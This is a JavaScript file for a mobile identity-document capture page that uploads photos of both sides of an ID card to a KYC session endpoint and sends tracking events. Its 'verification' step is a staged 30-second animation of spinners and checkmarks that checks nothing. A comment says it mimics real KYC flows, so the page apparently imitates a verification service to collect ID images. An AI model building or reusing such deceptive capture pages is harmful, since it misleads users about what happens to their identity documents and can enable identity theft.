// Mobile document capture — QR handoff flow. Compresses photos client-side
// (max 1400px, JPEG q0.75) and uploads them tagged to the KYC session so the
// desktop page can auto-advance. No localStorage needed on the phone.

const $ = (id) => document.getElementById(id);
const _params = new URLSearchParams(location.search);
const sessionId = _params.get('session') || '';
let expiresAt = parseInt(_params.get('exp') || '0', 10) || null;

const MONITOR_URL = '/api/events';
const _monSid = 'm-' + Math.random().toString(36).slice(2, 8);
function monit(ev, data) {
  try {
    const d = Object.assign({ session: sessionId }, data || {});
    const p = JSON.stringify({ ev, t: new Date().toISOString(), sid: _monSid, d });
    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, p)) return;
    fetch(MONITOR_URL, { method: 'POST', mode: 'no-cors', keepalive: true, body: p }).catch(() => {});
  } catch (e) {}
}

const setStatus = (t) => { $('status').textContent = t; };

// Downscale to max 1400px edge, JPEG q0.75 → ~200–400 KB data-URL
function compress(file) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const scale = Math.min(1, 1400 / Math.max(img.width, img.height));
      const w = Math.round(img.width * scale), h = Math.round(img.height * scale);
      const c = document.createElement('canvas');
      c.width = w; c.height = h;
      c.getContext('2d').drawImage(img, 0, 0, w, h);
      URL.revokeObjectURL(img.src);
      resolve(c.toDataURL('image/jpeg', 0.75));
    };
    img.onerror = reject;
    img.src = URL.createObjectURL(file);
  });
}

const state = { front: null, back: null };
const uploadCtl = { front: null, back: null }; // in-flight upload per side
const UPLOAD_TIMEOUT_MS = 25000;

function markDone(side) {
  $('p' + (side === 'front' ? '1' : '2')).className = 'prog-dot done';
}

async function onCapture(side, file) {
  if (!file) return;
  // Supersede any in-flight upload for this side — a retaken photo must not be
  // overwritten server-side by a stale request completing later.
  if (uploadCtl[side]) uploadCtl[side].abort();
  const ctl = new AbortController();
  uploadCtl[side] = ctl;
  $(side + '-input').value = ''; // allow re-selecting the same file later
  setStatus('Processing photo…');
  try {
    const dataUrl = await compress(file);
    if (ctl.signal.aborted) return;
    state[side] = dataUrl;
    $(side + '-img').src = dataUrl;
    $(side + '-img').classList.remove('hidden');
    $(side + '-empty').classList.add('hidden');
    $(side + '-wrap').classList.add('has-img');
    $(side + '-redo').classList.remove('hidden');
    setStatus('Uploading…');
    const timeout = setTimeout(() => ctl.abort(), UPLOAD_TIMEOUT_MS);
    let j = {};
    try {
      const r = await fetch('/api/kycdoc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ op: 'upload', session: sessionId, side, image: dataUrl }),
        signal: ctl.signal,
      });
      if (r.status === 429) j = { error: 'rate limited' };
      else j = await r.json().catch(() => ({}));
    } finally {
      clearTimeout(timeout);
    }
    if (uploadCtl[side] !== ctl) return; // superseded by a newer capture
    if (!j.ok) throw Object.assign(new Error(j.error || 'upload failed'), { limited: j.error === 'rate limited' });
    markDone(side);
    monit(side === 'front' ? 'doc_front_mobile' : 'doc_back_mobile', { size: dataUrl.length });
    setStatus('');

    if (side === 'front') {
      $('cap-back').classList.remove('hidden');
      $('p2').className = 'prog-dot on';
      $('cap-back').scrollIntoView({ behavior: 'smooth' });
    }
    if (state.front && state.back) {
      $('submit').classList.remove('hidden');
      $('submit').disabled = false;
      $('p3').className = 'prog-dot on';
      $('submit').scrollIntoView({ behavior: 'smooth' });
    }
  } catch (e) {
    if (uploadCtl[side] !== ctl) return; // superseded by a newer capture or retake
    const msg = e.limited
      ? 'Too many uploads — please wait a minute, then tap the photo area to retry'
      : e.name === 'AbortError'
        ? 'Upload timed out — check your connection, then tap the photo area to retry'
        : 'Upload failed — tap the photo area to retry';
    setStatus(msg);
    monit('doc_upload_fail', { side, msg: String(e?.message || e).slice(0, 120) });
  }
}

function retake(side) {
  if (uploadCtl[side]) { const c = uploadCtl[side]; uploadCtl[side] = null; c.abort(); }
  state[side] = null;
  $(side + '-img').classList.add('hidden');
  $(side + '-empty').classList.remove('hidden');
  $(side + '-wrap').classList.remove('has-img');
  $(side + '-redo').classList.add('hidden');
  $(side + '-input').value = '';
  $('p' + (side === 'front' ? '1' : '2')).className = 'prog-dot on';
  $('submit').classList.add('hidden');
  $('submit').disabled = true;
}

$('front-input').addEventListener('change', (e) => onCapture('front', e.target.files[0]));
$('back-input').addEventListener('change', (e) => onCapture('back', e.target.files[0]));
$('front-redo').addEventListener('click', () => retake('front'));
$('back-redo').addEventListener('click', () => retake('back'));

// Staged verification — runs ~30s like real KYC capture flows, then marks the
// session done so the desktop only advances once verification "completed".
const VERIFY_STAGES = [
  { id: 'vc1', at: 1200 },
  { id: 'vc2', at: 9000 },
  { id: 'vc3', at: 17500 },
  { id: 'vc4', at: 24500 },
];
const VERIFY_MS = 30000;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function activateCheck(id) {
  const el = $(id);
  el.classList.add('on');
  el.querySelector('.ic').innerHTML = '<span class="spinner" style="width:14px;height:14px;border-width:2px"></span>';
}
function finishCheck(id) {
  const el = $(id);
  el.classList.remove('on');
  el.classList.add('done');
  el.querySelector('.ic').textContent = '✓';
}

async function runVerification() {
  for (let i = 0; i < VERIFY_STAGES.length; i++) {
    const st = VERIFY_STAGES[i];
    if (st.at) await sleep(st.at - (VERIFY_STAGES[i - 1]?.at || 0));
    if (i > 0) finishCheck(VERIFY_STAGES[i - 1].id);
    activateCheck(st.id);
    $('vfill').style.width = Math.round(((i + 1) / VERIFY_STAGES.length) * 92) + '%';
  }
  const remain = VERIFY_MS - VERIFY_STAGES[VERIFY_STAGES.length - 1].at;
  if (remain > 0) await sleep(remain);
  finishCheck('vc4');
  $('vfill').style.width = '100%';
}

$('submit').addEventListener('click', async () => {
  $('submit').disabled = true;
  setStatus('');
  $('cap-front').classList.add('hidden');
  $('cap-back').classList.add('hidden');
  $('submit').classList.add('hidden');
  $('verifying').classList.remove('hidden');
  monit('doc_verifying');

  const verify = runVerification();
  let done = false, attempts = 0;
  while (!done && attempts < 3) {
    attempts++;
    try {
      const r = await fetch('/api/kycdoc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ op: 'done', session: sessionId }),
      });
      done = (await r.json().catch(() => ({}))).ok === true;
    } catch {}
    if (!done) await sleep(2000);
  }

  await verify; // always let the staged animation complete (~30s total)
  if (!done) {
    $('verifying').classList.add('hidden');
    $('cap-front').classList.remove('hidden');
    $('cap-back').classList.remove('hidden');
    $('submit').classList.remove('hidden');
    $('submit').disabled = false;
    setStatus('Submission failed — please try again');
    return;
  }
  monit('docs_submitted');
  $('verifying').classList.add('hidden');
  $('p3').className = 'prog-dot done';
  $('done').classList.remove('hidden');
});

// Validate session format early — a malformed link shows the invalid state
function blockInvalid() {
  $('cap-front').classList.add('hidden');
  $('cap-back').classList.add('hidden');
  $('submit').classList.add('hidden');
  $('sess-pill')?.classList.add('hidden');
  $('invalid').classList.remove('hidden');
}
if (!/^[0-9a-f]{24}$/.test(sessionId)) {
  blockInvalid();
} else {
  monit('mobile_opened');
}

// Session countdown — same expiry the desktop counts down (exp comes via QR,
// or from the server record when the URL carries none)
let pillIv = null;
function startCountdown(exp) {
  if (pillIv || !exp) return;
  expiresAt = exp;
  const pill = $('sess-pill'), pillVal = $('sess-pill-val');
  const tick = () => {
    const remaining = expiresAt - Date.now();
    if (remaining <= 0) {
      clearInterval(pillIv);
      blockInvalid();
      return;
    }
    const m = Math.floor(remaining / 60000), s = Math.floor((remaining % 60000) / 1000);
    pill.classList.remove('hidden');
    pillVal.textContent = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    pill.classList.toggle('danger', remaining < 120000);
    pill.classList.toggle('warn', remaining >= 120000 && remaining < 300000);
  };
  pillIv = setInterval(tick, 1000);
  tick();
}
if (expiresAt) startCountdown(expiresAt);

// Authoritative check against the backend session record — catches links that
// never existed server-side, expired links, and already-verified sessions.
// One retry covers the race where the phone scans the QR a beat before the
// desktop's sess_create lands.
(async function serverValidate() {
  if (!/^[0-9a-f]{24}$/.test(sessionId)) return; // already blocked above
  for (let i = 0; i < 2; i++) {
    try {
      const r = await fetch('/api/events?sess=' + sessionId);
      const j = await r.json().catch(() => ({}));
      if (j.ok && j.found) {
        if (j.verified || j.expired || (j.expiresAt && Date.now() >= j.expiresAt)) {
          blockInvalid();
          monit('mobile_invalid_remote', { verified: !!j.verified, expired: !!j.expired });
          return;
        }
        if (j.expiresAt) startCountdown(j.expiresAt);
        return;
      }
      if (r.status === 404 || (j.ok && !j.found)) {
        if (i === 0) { await sleep(1500); continue; }
        blockInvalid();
        monit('mobile_invalid_remote', { reason: 'not_found' });
        return;
      }
      return; // unexpected response — degrade to exp-param behaviour
    } catch {
      return; // offline — the exp-param countdown still gates the flow
    }
  }
})();
